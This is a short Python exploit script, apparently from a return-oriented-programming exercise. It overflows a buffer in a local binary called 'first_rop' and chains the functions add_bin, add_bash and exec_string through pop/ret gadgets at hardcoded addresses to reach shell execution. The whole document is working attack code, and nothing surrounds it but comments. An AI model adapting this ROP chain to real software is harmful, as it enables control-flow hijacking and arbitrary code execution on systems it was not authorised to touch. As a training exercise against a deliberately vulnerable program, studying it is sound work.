import os
import struct

#Find gadgets
pop_ret = 0x804858f
pop_pop_ret = 0x804858e
exec_string = 0x0804844d
add_bin = 0x08048461
add_bash = 0x0804849c

#Buffer Overflow
payload = "A"*0x6c
payload += "BBBB"

#add_bin(0xdeadbeef) gadget
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

#add_bash(0xcafebabe, 0x0badf00d) gadget
payload += struct.pack("I", add_bash)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0x0badf00d)

#exec_string
payload += struct.pack("I", exec_string)

print(payload)

os.system("./first_rop \"%s\"" % payload)
